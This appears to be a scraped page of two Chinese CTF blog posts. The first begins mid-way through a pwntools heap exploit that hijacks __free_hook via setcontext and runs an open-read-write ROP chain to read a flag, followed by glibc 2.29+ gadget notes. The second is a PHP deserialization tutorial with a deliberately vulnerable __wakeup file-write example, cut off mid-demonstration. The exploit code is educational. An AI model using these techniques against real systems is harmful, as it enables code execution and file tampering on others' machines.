&quot;).ljust(8, b&quot;\x00&quot;)) heap_base = heap-0x1920 print(&quot;heap base: &quot;, hex(heap_base)) head = heap_base+0x10 add(0x30) edit(p64(head)) add(0x30) add(0x30) str = p64(0)*4+p64(0x00000000ff000000) edit(str) delete() show() libc = u64(ru(&quot;
&quot;).ljust(8, b&quot;\x00&quot;)) libc_base = libc-0x70-libc.sym[&quot;__malloc_hook&quot;] setcontext = libc_base+libc.sym[&quot;setcontext&quot;]+53 free_hook = libc_base+libc.sym[&quot;__free_hook&quot;] print(&quot;libc base: &quot;, hex(libc_base)) print(&quot;setcontext_53: &quot;, hex(setcontext)) print(&quot;free_hook: &quot;, hex(free_hook)) flag_addr = heap_base+0x2000 pop_rax_ret = base+0x000000000001ced0 pop_rdi_ret = base+0x000000000002144f pop_rsi_ret = base+0x0000000000021e22 pop_rdx_ret = base+0x0000000000001b96 read = base+libc.sym[&quot;read&quot;] write = base+libc.sym[&quot;write&quot;] syscall = read_f+0xf orw = p64(pop_rdi_ret)+p64(flag_addr) orw += p64(pop_rsi_ret)+p64(0) orw += p64(pop_rax_ret)+p64(2) orw += p64(syscall) orw += p64(pop_rdi_ret)+p64(3) orw += p64(pop_rsi_ret)+p64(flag_addr) orw += p64(pop_rdx_ret)+p64(0x30) orw += p64(read_f) orw += p64(pop_rdi_ret)+p64(1) orw += p64(pop_rsi_ret)+p64(flag_addr) orw += p64(pop_rdx_ret)+p64(0x30) orw += p64(write_f) add(0x48) edit(p64(0)*9) for i in range(5): add(0x10) add(0x18) edit(p64(heap_base+0x50)) add(0x38) orw_addr = heap_base+0x1000 payload = p64(free_hook) payload += p64(heap_base+0x2000) payload += p64(heap_base+0x20A0) payload += p64(heap_base+0x2000) payload += p64(orw_addr+0x60) + p64(orw_addr) payload += p64(0) edit(payload) add(0x10) edit(p64(setcontext)) add(0x20) edit(&quot;./flag\x00&quot;) add(0x30) pl = p64(orw_addr) + p64(pop_rdi_ret+1) edit(pl) add(0x60) edit(orw[:0x60]) add(0x50) edit(orw[0x60:]) delete() itr()#爆破'''i = 0while 1: i += 1 log.warn(str(i)) try: pwn() except Exception: p.close() if(local == 1): p = process(binary) else: p = remote(ip,port) continue'''if __name__ == '__main__': pwn() 高版本GLIBC-SETCONTEXT的变化在GLIBC版本为2.29开始，setcontext的索引就从rdi改成了rdx 如图： 如果我们按照之前的思路的话，需要我们先通过ROP控制RDX的值。众所周知利用gadget控制rdx的寄存器比较困难。那么这样的话我们需要找到一些比较方便的gadget去间接控制rdx寄存器。 gadget第一个是getkeyserv_handle+576 可以通过这个gadget通过rdi来控制rdx寄存器（适用版本为Glibc2.29到2.32 123mov rdx, [rdi+8]mov [rsp+0C8h+var_C8], raxcall qword ptr [rdx+20h] 后记总结下利用的方法来巩固自己的知识，也希望能帮助到像我一样迷茫的人。如有错误请斧正。 参考链接：(9条消息) pwn题堆利用的一些姿势 – setcontext___lifanxin的博客-CSDN博客 (9条消息) 2021第十四届全国大学生信息安全竞赛WP（CISCN）– pwn部分___lifanxin的博客-CSDN博客_信息安全国赛 (9条消息) tcache的利用方法_qq_39869547的博客-CSDN博客_tcache PWN堆溢出技巧：ORW的解题手法与万金油Gadgets - 安全客，安全资讯平台 (anquanke.com)

前言我已经做过不少反序列化的题目了，但是对此概念还是有不少的疑惑，所以参考大佬的博客做一下总结。 面向对象在总结序列化和反序列化之前，先了解一下PHP的面向对象。 万物皆可对象。根据官方手册，PHP中，以关键字class定义一个类，一个类可以包含有属于自己的常量，变量（称为属性）以及函数（称为方法）。 12345678910class People{ //声明属性 public $name; //声明方法 public function eat() { echo $this-&gt;name.&quot;在吃饭&quot;; }} 现在已经定义好一个类，接下来用关键字new来实例化这个类 123$people_1 = new People(); //实例化对象$people_1-&gt;name = '张三'; //属性赋值$people_1-&gt;Eat(); //调用方法 完整的代码就是 12345678910111213141516&lt;?phpclass People{ public $name; public function eat() { echo $this-&gt;name.&quot;在吃饭&quot;; }}$people_1 = new People();$people_1-&gt;name = '张三';$people_1-&gt;Eat();?&gt; 运行一下就是 PHP的反序列化和序列化根据官方手册，所有PHP里面的值都可以使用serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回PHP原来的值。序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。emmmmm。。。。。个人理解其实就是为了解决PHP在执行当前脚本需要跨脚本文件传递某些变量的内容时，但因为之前脚本执行完成后把内容释放掉从而无法获取的问题。serialize可以将变量装换成字符串，并且再转换的过程中可以保存当前变量的值，而unserialize则可以将serialize生成的字符串转换回变量。 根据之前的例子，再加个age属性 123456789101112131415161718192021&lt;?phpclass People{ public $name; public $age; //新加属性 public function Eat() { echo $this-&gt;name.&quot;在吃饭&lt;/br&gt;&quot;; }}$people_1 = new People();$people_1-&gt;name = '张三';$people_1-&gt;age = 18;$people_1-&gt;Eat(); //序列化echo serialize($people_1);?&gt; 运行效果就是： O:6:”People”:2:{s:4:”name”;s:6:”张三”;s:3:”age”;i:18;}就是当前people_1这个对象序列化后的形式。”O”代表对象，“6”表示对象所属的类长度为6，“People”为类名，“2”表示有2个参数。“{}”里面时参数的key和value，s:4:”name”表示这个参数的string类型，长度为4，key值是name。后面以此类推，i表示int类型 然后反序列化这段，新建一个文件test.php 12345678910111213141516171819&lt;?phpclass People{ public $name; public $age; public function eat() { echo $this-&gt;name.&quot;在吃饭&lt;/br&gt;&quot;; }}//重建对象$usr = unserialize('O:6:&quot;People&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;张三&quot;;s:3:&quot;age&quot;;i:18;}');//输出$usr-&gt;eat();?&gt; 效果如下： 其实我感觉，序列化和反序列化就类似于存取数组。举个不怎么恰当的例子，就像积木，序列化就是把一个搭建好的积木收拾好，反序列化就是把收拾好的积木再按照原来的样子搭建好。那么接下来要讲的反序列化漏洞就类似于把原来的积木换了个颜色，某块积木形状对但是颜色不对，按照图纸搭起来的感觉就是违和的。 PHP反序列化漏洞了解了什么是序列化和反序列化之后，是时候研究一下PHP反序列化漏洞了，实际上，PHP反序列化漏洞利用的条件在实际环境中比较苛刻，但是如果可以利用一般都会产生很严重的后果 漏洞需要的条件1、unserialize函数的参数可控 2、所写的内容需要有对象中的成员变量的值 3、脚本中存在一个构造函数（__construct()）、析构函数（–destruct()）、–wakeup()函数中有向php文件中写数据的操作的类 123456789__construct()当一个对象创建时被调用__destruct()当一个对象销毁时被调用__toString()当一个对象被当作一个字符串使用__sleep() 在对象在被序列化之前运行__wakeup将在序列化之后立即被调用所写的内容需要有对象中的成员变量的值 接一个例子 创建test3.php 123456789101112131415161718&lt;?php class Test{ var $test = &quot;123&quot;; function __wakeup(){ $fp = fopen(&quot;test.php&quot;, 'w'); fwrite($fp, $this -&gt; test); fclose($fp); }}$test1 = $_GET['test'];print_r($test1);echo &quot;&lt;br /&gt;&quot;;$seri = unserialize($test1);require &quot;test.php&quot;;?&gt; 分析一下，test类有个重写的__wakeup()这个魔术函数方法，当序列化后，打开test.php，权限为写，将$test值重写到test.php，用GET方式将值传入$test1，然后反序列化。就是我们如果传入一个序列化后的EXP传入，test.php就会变成我们传入的内容 当值为空时，访问本地环境/test3.php?test= 根据刚刚的方法，新建一个脚本，序列化一下 1234567891011121314&lt;?php class Test{ var $test = &quot;123&quot;; function __wakeup(){ $fp = fopen(&quot;test.php&quot;, 'w'); fwrite($fp, $this -&gt; test); fclose($fp); }}$test = new Test();echo serialize($test);?&gt; 然后我们跟上参数 O:4:”Test”:1:{s:4:”test”;s:3:”123”;} 发现不但页面改变了而且连原文件都被重写了 POP链POP，面向属性编程，之前理解的序列化攻击多是在魔术方法上出现一些利用漏洞，自动调用从而触发漏洞。但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。 字符逃逸+POP链构造漏洞产生的原因：序列化的字符串在经过过滤函数不正确的处理而导致对象注入，目前看到都是因为过滤函数放在了serialize函数之后，要是放在序列化之前应该就不会产生这个问题 演示1234567891011121314151617181920212223&lt;?phpfunction filter($string){ $a = str_replace('x','zz',$string); //将字符串的x替换成zz return $a;}$username = &quot;tr1ple&quot;;$password = &quot;aaaaax&quot;;$user = array($username, $password); //将username，password传入user数组echo(serialize($user)); //序列化数组echo &quot;
&quot;;$r = filter(serialize($user)); //将序列化好的字符中的x替换成zzecho($r);echo &quot;
